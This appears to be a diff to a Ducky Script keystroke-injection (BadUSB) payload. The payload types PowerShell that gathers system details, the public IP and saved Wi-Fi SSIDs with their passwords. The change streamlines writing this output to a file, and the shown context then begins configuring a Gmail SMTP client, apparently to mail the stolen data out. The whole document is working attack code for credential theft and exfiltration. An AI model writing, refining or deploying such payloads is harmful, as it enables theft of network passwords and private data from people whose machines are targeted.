@@ -89,6 +89,8 @@ STRING }
 SHIFT ENTER
 STRING Clear-Host
 SHIFT ENTER
+STRING $(
+SHIFT ENTER
 STRING Write-Host "System Information for: " $computerSystem.Name -BackgroundColor DarkCyan
 SHIFT ENTER
 STRING "Manufacturer: " + $computerSystem.Manufacturer
@@ -119,46 +121,10 @@ STRING "Public IP adress: " + $computerPubIP
 SHIFT ENTER
 STRING $profileNames | Sort-Object ProfileName | Select-Object ProfileName, SSID, Password
 SHIFT ENTER
-ENTER
-DELAY 1000
-ALT SPACE
-DELAY 200
-DOWN
-DELAY 100
-DOWN
-DELAY 100
-DOWN
-DELAY 100
-DOWN
-DELAY 100
-DOWN
-DELAY 100
-DOWN
-DELAY 100
-RIGHT
-DELAY 100
-DOWN
-DELAY 100
-DOWN
-DELAY 100
-DOWN
-DELAY 100
-ENTER
-DELAY 100
-CTRL c
-DELAY 200
-STRING out-file i.txt
+) *>&1 > i.txt
+SHIFT ENTER
 ENTER
 DELAY 2000
-STRING start i.txt
-ENTER
-DELAY 2000
-CTRL v
-DELAY 300
-CTRL s
-DELAY 300
-ALT F4
-DELAY 300
 STRING $SMTPServer = 'smtp.gmail.com'
 ENTER
 STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
